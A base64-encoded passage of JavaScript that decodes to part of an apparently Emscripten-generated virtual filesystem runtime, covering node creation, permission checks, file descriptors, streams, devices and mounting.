IG5vZGVOYW1lID09PSBuYW1lKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbm9kZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBGUy5sb29rdXAocGFyZW50LCBuYW1lKQogICAgfSksCiAgICBjcmVhdGVOb2RlOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBtb2RlLCByZGV2KSB7CiAgICAgICAgaWYoIUZTLkZTTm9kZSkgewogICAgICAgICAgICBGUy5GU05vZGUgPSAoZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBtb2RlLCByZGV2KSB7CiAgICAgICAgICAgICAgICBpZighcGFyZW50KSB7CiAgICAgICAgICAgICAgICAgICAgcGFyZW50ID0gdGhpcwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgdGhpcy5wYXJlbnQgPSBwYXJlbnQ7CiAgICAgICAgICAgICAgICB0aGlzLm1vdW50ID0gcGFyZW50Lm1vdW50OwogICAgICAgICAgICAgICAgdGhpcy5tb3VudGVkID0gbnVsbDsKICAgICAgICAgICAgICAgIHRoaXMuaWQgPSBGUy5uZXh0SW5vZGUrKzsKICAgICAgICAgICAgICAgIHRoaXMubmFtZSA9IG5hbWU7CiAgICAgICAgICAgICAgICB0aGlzLm1vZGUgPSBtb2RlOwogICAgICAgICAgICAgICAgdGhpcy5ub2RlX29wcyA9IHt9OwogICAgICAgICAgICAgICAgdGhpcy5zdHJlYW1fb3BzID0ge307CiAgICAgICAgICAgICAgICB0aGlzLnJkZXYgPSByZGV2CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBGUy5GU05vZGUucHJvdG90eXBlID0ge307CiAgICAgICAgICAgIHZhciByZWFkTW9kZSA9IDI5MiB8IDczOwogICAgICAgICAgICB2YXIgd3JpdGVNb2RlID0gMTQ2OwogICAgICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydGllcyhGUy5GU05vZGUucHJvdG90eXBlLCB7CiAgICAgICAgICAgICAgICByZWFkOiB7CiAgICAgICAgICAgICAgICAgICAgZ2V0OiAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAodGhpcy5tb2RlICYgcmVhZE1vZGUpID09PSByZWFkTW9kZQogICAgICAgICAgICAgICAgICAgIH0pLCBzZXQ6IChmdW5jdGlvbih2YWwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFsID8gdGhpcy5tb2RlIHw9IHJlYWRNb2RlIDogdGhpcy5tb2RlICY9IH5yZWFkTW9kZQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9LCB3cml0ZTogewogICAgICAgICAgICAgICAgICAgIGdldDogKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKHRoaXMubW9kZSAmIHdyaXRlTW9kZSkgPT09IHdyaXRlTW9kZQogICAgICAgICAgICAgICAgICAgIH0pLCBzZXQ6IChmdW5jdGlvbih2YWwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFsID8gdGhpcy5tb2RlIHw9IHdyaXRlTW9kZSA6IHRoaXMubW9kZSAmPSB+d3JpdGVNb2RlCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0sIGlzRm9sZGVyOiB7CiAgICAgICAgICAgICAgICAgICAgZ2V0OiAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBGUy5pc0Rpcih0aGlzLm1vZGUpCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0sIGlzRGV2aWNlOiB7CiAgICAgICAgICAgICAgICAgICAgZ2V0OiAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBGUy5pc0NocmRldih0aGlzLm1vZGUpCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkKICAgICAgICB9CiAgICAgICAgdmFyIG5vZGUgPSBuZXcgRlMuRlNOb2RlKHBhcmVudCwgbmFtZSwgbW9kZSwgcmRldik7CiAgICAgICAgRlMuaGFzaEFkZE5vZGUobm9kZSk7CiAgICAgICAgcmV0dXJuIG5vZGUKICAgIH0pLAogICAgZGVzdHJveU5vZGU6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgRlMuaGFzaFJlbW92ZU5vZGUobm9kZSkKICAgIH0pLAogICAgaXNSb290OiAoZnVuY3Rpb24obm9kZSkgewogICAgICAgIHJldHVybiBub2RlID09PSBub2RlLnBhcmVudAogICAgfSksCiAgICBpc01vdW50cG9pbnQ6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgcmV0dXJuICEhbm9kZS5tb3VudGVkCiAgICB9KSwKICAgIGlzRmlsZTogKGZ1bmN0aW9uKG1vZGUpIHsKICAgICAgICByZXR1cm4gKG1vZGUgJiA2MTQ0MCkgPT09IDMyNzY4CiAgICB9KSwKICAgIGlzRGlyOiAoZnVuY3Rpb24obW9kZSkgewogICAgICAgIHJldHVybiAobW9kZSAmIDYxNDQwKSA9PT0gMTYzODQKICAgIH0pLAogICAgaXNMaW5rOiAoZnVuY3Rpb24obW9kZSkgewogICAgICAgIHJldHVybiAobW9kZSAmIDYxNDQwKSA9PT0gNDA5NjAKICAgIH0pLAogICAgaXNDaHJkZXY6IChmdW5jdGlvbihtb2RlKSB7CiAgICAgICAgcmV0dXJuIChtb2RlICYgNjE0NDApID09PSA4MTkyCiAgICB9KSwKICAgIGlzQmxrZGV2OiAoZnVuY3Rpb24obW9kZSkgewogICAgICAgIHJldHVybiAobW9kZSAmIDYxNDQwKSA9PT0gMjQ1NzYKICAgIH0pLAogICAgaXNGSUZPOiAoZnVuY3Rpb24obW9kZSkgewogICAgICAgIHJldHVybiAobW9kZSAmIDYxNDQwKSA9PT0gNDA5NgogICAgfSksCiAgICBpc1NvY2tldDogKGZ1bmN0aW9uKG1vZGUpIHsKICAgICAgICByZXR1cm4gKG1vZGUgJiA0OTE1MikgPT09IDQ5MTUyCiAgICB9KSwKICAgIGZsYWdNb2RlczogewogICAgICAgICJyIjogMCwKICAgICAgICAicnMiOiAxMDUyNjcyLAogICAgICAgICJyKyI6IDIsCiAgICAgICAgInciOiA1NzcsCiAgICAgICAgInd4IjogNzA1LAogICAgICAgICJ4dyI6IDcwNSwKICAgICAgICAidysiOiA1NzgsCiAgICAgICAgInd4KyI6IDcwNiwKICAgICAgICAieHcrIjogNzA2LAogICAgICAgICJhIjogMTA4OSwKICAgICAgICAiYXgiOiAxMjE3LAogICAgICAgICJ4YSI6IDEyMTcsCiAgICAgICAgImErIjogMTA5MCwKICAgICAgICAiYXgrIjogMTIxOCwKICAgICAgICAieGErIjogMTIxOAogICAgfSwKICAgIG1vZGVTdHJpbmdUb0ZsYWdzOiAoZnVuY3Rpb24oc3RyKSB7CiAgICAgICAgdmFyIGZsYWdzID0gRlMuZmxhZ01vZGVzW3N0cl07CiAgICAgICAgaWYodHlwZW9mIGZsYWdzID09PSAidW5kZWZpbmVkIikgewogICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoIlVua25vd24gZmlsZSBvcGVuIG1vZGU6ICIgKyBzdHIpCiAgICAgICAgfQogICAgICAgIHJldHVybiBmbGFncwogICAgfSksCiAgICBmbGFnc1RvUGVybWlzc2lvblN0cmluZzogKGZ1bmN0aW9uKGZsYWcpIHsKICAgICAgICB2YXIgcGVybXMgPSBbInIiLCAidyIsICJydyJdW2ZsYWcgJiAzXTsKICAgICAgICBpZihmbGFnICYgNTEyKSB7CiAgICAgICAgICAgIHBlcm1zICs9ICJ3IgogICAgICAgIH0KICAgICAgICByZXR1cm4gcGVybXMKICAgIH0pLAogICAgbm9kZVBlcm1pc3Npb25zOiAoZnVuY3Rpb24obm9kZSwgcGVybXMpIHsKICAgICAgICBpZihGUy5pZ25vcmVQZXJtaXNzaW9ucykgewogICAgICAgICAgICByZXR1cm4gMAogICAgICAgIH0KICAgICAgICBpZihwZXJtcy5pbmRleE9mKCJyIikgIT09IC0xICYmICEobm9kZS5tb2RlICYgMjkyKSkgewogICAgICAgICAgICByZXR1cm4gRVJSTk9fQ09ERVMuRUFDQ0VTCiAgICAgICAgfSBlbHNlIGlmKHBlcm1zLmluZGV4T2YoInciKSAhPT0gLTEgJiYgIShub2RlLm1vZGUgJiAxNDYpKSB7CiAgICAgICAgICAgIHJldHVybiBFUlJOT19DT0RFUy5FQUNDRVMKICAgICAgICB9IGVsc2UgaWYocGVybXMuaW5kZXhPZigieCIpICE9PSAtMSAmJiAhKG5vZGUubW9kZSAmIDczKSkgewogICAgICAgICAgICByZXR1cm4gRVJSTk9fQ09ERVMuRUFDQ0VTCiAgICAgICAgfQogICAgICAgIHJldHVybiAwCiAgICB9KSwKICAgIG1heUxvb2t1cDogKGZ1bmN0aW9uKGRpcikgewogICAgICAgIHZhciBlcnIgPSBGUy5ub2RlUGVybWlzc2lvbnMoZGlyLCAieCIpOwogICAgICAgIGlmKGVycikgcmV0dXJuIGVycjsKICAgICAgICBpZighZGlyLm5vZGVfb3BzLmxvb2t1cCkgcmV0dXJuIEVSUk5PX0NPREVTLkVBQ0NFUzsKICAgICAgICByZXR1cm4gMAogICAgfSksCiAgICBtYXlDcmVhdGU6IChmdW5jdGlvbihkaXIsIG5hbWUpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICB2YXIgbm9kZSA9IEZTLmxvb2t1cE5vZGUoZGlyLCBuYW1lKTsKICAgICAgICAgICAgcmV0dXJuIEVSUk5PX0NPREVTLkVFWElTVAogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgIH0KICAgICAgICByZXR1cm4gRlMubm9kZVBlcm1pc3Npb25zKGRpciwgInd4IikKICAgIH0pLAogICAgbWF5RGVsZXRlOiAoZnVuY3Rpb24oZGlyLCBuYW1lLCBpc2RpcikgewogICAgICAgIHZhciBub2RlOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIG5vZGUgPSBGUy5sb29rdXBOb2RlKGRpciwgbmFtZSkKICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgcmV0dXJuIGUuZXJybm8KICAgICAgICB9CiAgICAgICAgdmFyIGVyciA9IEZTLm5vZGVQZXJtaXNzaW9ucyhkaXIsICJ3eCIpOwogICAgICAgIGlmKGVycikgewogICAgICAgICAgICByZXR1cm4gZXJyCiAgICAgICAgfQogICAgICAgIGlmKGlzZGlyKSB7CiAgICAgICAgICAgIGlmKCFGUy5pc0Rpcihub2RlLm1vZGUpKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gRVJSTk9fQ09ERVMuRU5PVERJUgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKEZTLmlzUm9vdChub2RlKSB8fCBGUy5nZXRQYXRoKG5vZGUpID09PSBGUy5jd2QoKSkgewogICAgICAgICAgICAgICAgcmV0dXJuIEVSUk5PX0NPREVTLkVCVVNZCiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZihGUy5pc0Rpcihub2RlLm1vZGUpKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gRVJSTk9fQ09ERVMuRUlTRElSCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIDAKICAgIH0pLAogICAgbWF5T3BlbjogKGZ1bmN0aW9uKG5vZGUsIGZsYWdzKSB7CiAgICAgICAgaWYoIW5vZGUpIHsKICAgICAgICAgICAgcmV0dXJuIEVSUk5PX0NPREVTLkVOT0VOVAogICAgICAgIH0KICAgICAgICBpZihGUy5pc0xpbmsobm9kZS5tb2RlKSkgewogICAgICAgICAgICByZXR1cm4gRVJSTk9fQ09ERVMuRUxPT1AKICAgICAgICB9IGVsc2UgaWYoRlMuaXNEaXIobm9kZS5tb2RlKSkgewogICAgICAgICAgICBpZihGUy5mbGFnc1RvUGVybWlzc2lvblN0cmluZyhmbGFncykgIT09ICJyIiB8fCBmbGFncyAmIDUxMikgewogICAgICAgICAgICAgICAgcmV0dXJuIEVSUk5PX0NPREVTLkVJU0RJUgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBGUy5ub2RlUGVybWlzc2lvbnMobm9kZSwgRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmcoZmxhZ3MpKQogICAgfSksCiAgICBNQVhfT1BFTl9GRFM6IDQwOTYsCiAgICBuZXh0ZmQ6IChmdW5jdGlvbihmZF9zdGFydCwgZmRfZW5kKSB7CiAgICAgICAgZmRfc3RhcnQgPSBmZF9zdGFydCB8fCAwOwogICAgICAgIGZkX2VuZCA9IGZkX2VuZCB8fCBGUy5NQVhfT1BFTl9GRFM7CiAgICAgICAgZm9yKHZhciBmZCA9IGZkX3N0YXJ0OyBmZCA8PSBmZF9lbmQ7IGZkKyspIHsKICAgICAgICAgICAgaWYoIUZTLnN0cmVhbXNbZmRdKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZmQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTUZJTEUpCiAgICB9KSwKICAgIGdldFN0cmVhbTogKGZ1bmN0aW9uKGZkKSB7CiAgICAgICAgcmV0dXJuIEZTLnN0cmVhbXNbZmRdCiAgICB9KSwKICAgIGNyZWF0ZVN0cmVhbTogKGZ1bmN0aW9uKHN0cmVhbSwgZmRfc3RhcnQsIGZkX2VuZCkgewogICAgICAgIGlmKCFGUy5GU1N0cmVhbSkgewogICAgICAgICAgICBGUy5GU1N0cmVhbSA9IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIEZTLkZTU3RyZWFtLnByb3RvdHlwZSA9IHt9OwogICAgICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydGllcyhGUy5GU1N0cmVhbS5wcm90b3R5cGUsIHsKICAgICAgICAgICAgICAgIG9iamVjdDogewogICAgICAgICAgICAgICAgICAgIGdldDogKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5ub2RlCiAgICAgICAgICAgICAgICAgICAgfSksIHNldDogKGZ1bmN0aW9uKHZhbCkgewogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLm5vZGUgPSB2YWwKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfSwgaXNSZWFkOiB7CiAgICAgICAgICAgICAgICAgICAgZ2V0OiAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAodGhpcy5mbGFncyAmIDIwOTcxNTUpICE9PSAxCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0sIGlzV3JpdGU6IHsKICAgICAgICAgICAgICAgICAgICBnZXQ6IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICh0aGlzLmZsYWdzICYgMjA5NzE1NSkgIT09IDAKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfSwgaXNBcHBlbmQ6IHsKICAgICAgICAgICAgICAgICAgICBnZXQ6IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMuZmxhZ3MgJiAxMDI0CiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkKICAgICAgICB9CiAgICAgICAgdmFyIG5ld1N0cmVhbSA9IG5ldyBGUy5GU1N0cmVhbTsKICAgICAgICBmb3IodmFyIHAgaW4gc3RyZWFtKSB7CiAgICAgICAgICAgIG5ld1N0cmVhbVtwXSA9IHN0cmVhbVtwXQogICAgICAgIH0KICAgICAgICBzdHJlYW0gPSBuZXdTdHJlYW07CiAgICAgICAgdmFyIGZkID0gRlMubmV4dGZkKGZkX3N0YXJ0LCBmZF9lbmQpOwogICAgICAgIHN0cmVhbS5mZCA9IGZkOwogICAgICAgIEZTLnN0cmVhbXNbZmRdID0gc3RyZWFtOwogICAgICAgIHJldHVybiBzdHJlYW0KICAgIH0pLAogICAgY2xvc2VTdHJlYW06IChmdW5jdGlvbihmZCkgewogICAgICAgIEZTLnN0cmVhbXNbZmRdID0gbnVsbAogICAgfSksCiAgICBjaHJkZXZfc3RyZWFtX29wczogewogICAgICAgIG9wZW46IChmdW5jdGlvbihzdHJlYW0pIHsKICAgICAgICAgICAgdmFyIGRldmljZSA9IEZTLmdldERldmljZShzdHJlYW0ubm9kZS5yZGV2KTsKICAgICAgICAgICAgc3RyZWFtLnN0cmVhbV9vcHMgPSBkZXZpY2Uuc3RyZWFtX29wczsKICAgICAgICAgICAgaWYoc3RyZWFtLnN0cmVhbV9vcHMub3BlbikgewogICAgICAgICAgICAgICAgc3RyZWFtLnN0cmVhbV9vcHMub3BlbihzdHJlYW0pCiAgICAgICAgICAgIH0KICAgICAgICB9KSwgbGxzZWVrOiAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVTUElQRSkKICAgICAgICB9KQogICAgfSwKICAgIG1ham9yOiAoZnVuY3Rpb24oZGV2KSB7CiAgICAgICAgcmV0dXJuIGRldiA+PiA4CiAgICB9KSwKICAgIG1pbm9yOiAoZnVuY3Rpb24oZGV2KSB7CiAgICAgICAgcmV0dXJuIGRldiAmIDI1NQogICAgfSksCiAgICBtYWtlZGV2OiAoZnVuY3Rpb24obWEsIG1pKSB7CiAgICAgICAgcmV0dXJuIG1hIDw8IDggfCBtaQogICAgfSksCiAgICByZWdpc3RlckRldmljZTogKGZ1bmN0aW9uKGRldiwgb3BzKSB7CiAgICAgICAgRlMuZGV2aWNlc1tkZXZdID0ge3N0cmVhbV9vcHM6IG9wc30KICAgIH0pLAogICAgZ2V0RGV2aWNlOiAoZnVuY3Rpb24oZGV2KSB7CiAgICAgICAgcmV0dXJuIEZTLmRldmljZXNbZGV2XQogICAgfSksCiAgICBnZXRNb3VudHM6IChmdW5jdGlvbihtb3VudCkgewogICAgICAgIHZhciBtb3VudHMgPSBbXTsKICAgICAgICB2YXIgY2hlY2sgPSBbbW91bnRdOwogICAgICAgIHdoaWxlKGNoZWNrLmxlbmd0aCkgewogICAgICAgICAgICB2YXIgbSA9IGNoZWNrLnBvcCgpOwogICAgICAgICAgICBtb3VudHMucHVzaChtKTsKICAgICAgICAgICAgY2hlY2sucHVzaC5hcHBseShjaGVjaywgbS5tb3VudHMpCiAgICAgICAgfQogICAgICAgIHJldHVybiBtb3VudHMKICAgIH0pLAogICAgc3luY2ZzOiAoZnVuY3Rpb24ocG9wdWxhdGUsIGNhbGxiYWNrKSB7CiAgICAgICAgaWYodHlwZW9mIHBvcHVsYXRlID09PSAiZnVuY3Rpb24iKSB7CiAgICAgICAgICAgIGNhbGxiYWNrID0gcG9wdWxhdGU7CiAgICAgICAgICAgIHBvcHVsYXRlID0gZmFsc2UKICAgICAgICB9CiAgICAgICAgRlMuc3luY0ZTUmVxdWVzdHMrKzsKICAgICAgICBpZihGUy5zeW5jRlNSZXF1ZXN0cyA+IDEpIHsKICAgICAgICAgICAgY29uc29sZS5sb2coIndhcm5pbmc6ICIgKyBGUy5zeW5jRlNSZXF1ZXN0cyArICIgRlMuc3luY2ZzIG9wZXJhdGlvbnMgaW4gZmxpZ2h0IGF0IG9uY2UsIHByb2JhYmx5IGp1c3QgZG9pbmcgZXh0cmEgd29yayIpCiAgICAgICAgfQogICAgICAgIHZhciBtb3VudHMgPSBGUy5nZXRNb3VudHMoRlMucm9vdC5tb3VudCk7CiAgICAgICAgdmFyIGNvbXBsZXRlZCA9IDA7CgogICAgICAgIGZ1bmN0aW9uIGRvQ2FsbGJhY2soZXJyKSB7CiAgICAgICAgICAgIGFzc2VydChGUy5zeW5jRlNSZXF1ZXN0cyA+IDApOwogICAgICAgICAgICBGUy5zeW5jRlNSZXF1ZXN0cy0tOwogICAgICAgICAgICByZXR1cm4gY2FsbGJhY2soZXJyKQogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZG9uZShlcnIpIHsKICAgICAgICAgICAgaWYoZXJyKSB7CiAgICAgICAgICAgICAgICBpZighZG9uZS5lcnJvcmVkKSB7CiAgICAgICAgICAgICAgICAgICAgZG9uZS5lcnJvcmVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZG9DYWxsYmFjayhlcnIpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICBpZigrK2NvbXBsZXRlZCA+PSBtb3VudHMubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICBkb0NhbGxiYWNrKG51bGwpCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIG1vdW50cy5mb3JFYWNoKChmdW5jdGlvbihtb3VudCkgewogICAgICAgICAgICBpZighbW91bnQudHlwZS5zeW5jZnMpIHsKICAgICAgICAgICAgICAgIHJldHVybiBkb25lKG51bGwpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgbW91bnQudHlwZS5zeW5jZnMobW91bnQsIHBvcHVsYXRlLCBkb25lKQogICAgICAgIH0pKQogICAgfSksCiAgICBtb3VudDogKGZ1bmN0aW9uKHR5cGUsIG9wdHMsIG1vdW50cG9pbnQpIHsKICAgICAgICB2YXIgcm9vdCA9IG1vdW50cG9pbnQgPT09ICIvIjsKICAgICAgICB2YXIgcHNldWRvID0gIW1vdW50cG9pbnQ7CiAgICAgICAgdmFyIG5vZGU7CiAgICAgICAgaWYocm9vdCAmJiBGUy5yb290KSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKQogICAgICAgIH0gZWxzZSBpZighcm9vdCAmJiAhcHNldWRvKSB7CiAgICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKG1vdW50cG9pbnQsIHtmb2xsb3dfbW91bnQ6IGZhbHNlfSk7CiAgICAgICAgICAgIG1vdW50cG9pbnQgPSBsb29rdXAucGF0aDsKICAgICAgICAgICAgbm9kZSA9IGxvb2t1cC5ub2RlOwogICAgICAgICAgICBpZihGUy5pc01vdW50cG9pbnQobm9kZSkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCFGUy5pc0Rpcihub2RlLm1vZGUpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URElSKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHZhciBtb3VudCA9IHt0eXBlOiB0eXBlLCBvcHRzOiBvcHRzLCBtb3VudHBvaW50OiBtb3VudHBvaW50LCBtb3VudHM6IFtdfTsKICAgICAgICB2YXIgbW91bnRSb290ID0gdHlwZS5tb3VudChtb3VudCk7CiAgICAgICAgbW91bnRSb290Lm1vdW50ID0gbW91bnQ7CiAgICAgICAgbW91bnQucm9vdCA9IG1vdW50Um9vdDsKICAgICAgICBpZihyb290KSB7CiAgICAgICAgICAgIEZTLnJvb3QgPSBtb3VudFJvb3QKICAgICAgICB9IGVsc2UgaWYobm9kZSkgewogICAgICAgICAgICBub2RlLm1vdW50ZWQgPSBtb3VudDsKICAgICAgICAgICAgaWYobm9kZS5tb3VudCkgewogICAgICAgICAgICAgICAgbm9kZS5tb3VudC5tb3VudHMucHVzaChtb3VudCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gbW91bnRSb290CiAgICB9KSwKICAgIHVubW91bnQ6IChmdW5jdGlvbihtb3VudHBvaW50KSB7CiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgobW91bnRwb2ludCwge2ZvbGxvd19tb3VudDogZmFsc2V9KTsKICAgICAgICBpZighRlMuaXNNb3VudHBvaW50KGxvb2t1cC5ub2RlKSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpCiAgICAgICAgfQogICAgICAgIHZhciBub2RlID0gbG9va3VwLm5vZGU7CiAgICAgICAgdmFyIG1vdW50ID0gbm9kZS5tb3VudGVkOwogICAgICAgIHZhciBtb3VudHMgPSBGUy5nZXRNb3VudHMobW91bnQpOwogICAgICAgIE9iamVjdC5rZXlzKEZTLm5hbWVUYWJsZSkuZm9yRWFjaCgoZnVuY3Rpb24oaGFzaCkgewogICAgICAgICAgICB2YXIgY3VycmVudCA9IEZTLm5hbWVUYWJsZVtoYXNoXTsKICAgICAgICAgICAgd2hpbGUoY3VycmVudCkgewogICAgICAgICAgICAgICAgdmFyIG5leHQgPSBjdXJyZW50Lm5hbWVfbmV4dDsKICAgICAgICAgICAgICAgIGlmKG1vdW50cy5pbmRleE9mKGN1cnJlbnQubW91bnQpICE9PSAtMSkgewogICAgICAgICAgICAgICAgICAgIEZTLmRlc3Ryb3lOb2RlKGN1cnJlbnQpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjdXJyZW50ID0gbmV4dAogICAgICAgICAgICB9CiAgICAgICAgfSkpOwogICAgICAgIG5vZGUubW91bnRlZCA9IG51bGw7CiAgICAgICAgdmFyIGlkeCA9IG5vZGUubW91bnQubW91bnRzLmluZGV4T2YobW91bnQpOwogICAgICAgIGFzc2VydChpZHggIT09IC0xKTsKICAgICAgICBub2RlLm1vdW50Lm1vdW50cy5zcGxpY2UoaWR4LCAxKQogICAgfSksCiAgICBsb29rdXA6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUpIHsKICAgICAgICByZXR1cm4gcGFyZW50Lm5vZGVfb3BzLmxvb2t1cChwYXJlbnQsIG5hbWUpCiAgICB9KSwKICAgIG1rbm9kOiAoZnVuY3Rpb24ocGF0aCwgbW9kZSwgZGV2KSB7CiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwge3BhcmVudDogdHJ1ZX0pOwogICAgICAgIHZhciBwYXJlbnQgPSBsb29rdXAubm9kZTsKICAgICAgICB2YXIgbmFtZSA9IFBBVEguYmFzZW5hbWUocGF0aCk7CiAgICAgICAgaWYoIW5hbWUgfHwgbmFtZSA9PT0gIi4iIHx8IG5hbWUgPT09ICIuLiIpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKQogICAgICAgIH0KICAgICAgICB2YXIgZXJyID0gRlMubWF5Q3JlYXRlKHBhcmVudCwgbmFtZSk7CiAgICAgICAgaWYoZXJyKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycikKICAgICAgICB9CiAgICAgICAgaWYoIXBhcmVudC5ub2RlX29wcy5ta25vZCkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHBhcmVudC5ub2RlX29wcy5ta25vZChwYXJlbnQsIG5hbWUsIG1vZGUsIGRldikKICAgIH0pLAogICAgY3JlYXRlOiAoZnVuY3Rpb24ocGF0aCwgbW9kZSkgewogICAgICAgIG1vZGUgPSBtb2RlICE9PSB1bmRlZmluZWQgPyBtb2RlIDogNDM4OwogICAgICAgIG1vZGUgJj0gNDA5NTsKICAgICAgICBtb2RlIHw9IDMyNzY4OwogICAgICAgIHJldHVybiBGUy5ta25vZChwYXRoLCBtb2RlLCAwKQogICAgfSksCiAgICBta2RpcjogKGZ1bmN0aW9uKHBhdGgsIG1vZGUpIHsKICAgICAgICBtb2RlID0gbW9kZSAhPT0gdW5kZWZpbmVkID8gbW9kZSA6IDUxMTsKICAgICAgICBtb2RlICY9IDUxMSB8IDUxMjsKICAgICAgICBtb2RlIHw9IDE2Mzg0OwogICAgICAgIHJldHVybiBGUy5ta25vZChwYXRoLCBtb2RlLCAwKQogICAgfSksCiAgICBta2RpclRyZWU6IChmdW5jdGlvbihwYXRoLCBtb2RlKSB7CiAgICAgICAgdmFyIGRpcnMgPSBwYXRoLnNwbGl0KCIvIik7CiAgICAgICAgdmFyIGQgPSAiIjsKICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgZGlycy5sZW5ndGg7ICsraSkgewogICAgICAgICAgICBpZighZGlyc1tpXSkgY29udGludWU7CiAgICAgICAgICAgIGQgKz0gIi8iICsgZGlyc1tpXTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIEZTLm1rZGlyKGQsIG1vZGUpCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgaWYoZS5lcnJubyAhPSBFUlJOT19DT0RFUy5FRVhJU1QpIHRocm93IGUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0pLAogICAgbWtkZXY6IChmdW5jdGlvbihwYXRoLCBtb2RlLCBkZXYpIHsKICAgICAgICBpZih0eXBlb2YgZGV2ID09PSAidW5kZWZpbmVkIikgewogICAgICAgICAgICBkZXYgPSBtb2RlOwogICAgICAgICAgICBtb2RlID0gNDM4CiAgICAgICAgfQogICAgICAgIG1vZGUgfD0gODE5MjsKICAgICAgICByZXR1cm4gRlMubWtub2QocGF0aCwgbW9kZSwgZGV2KQogICAgfSksCiAgICBzeW1saW5rOiAoZnVuY3Rpb24ob2xkcGF0aCwgbmV3cGF0aCkgewogICAgICAg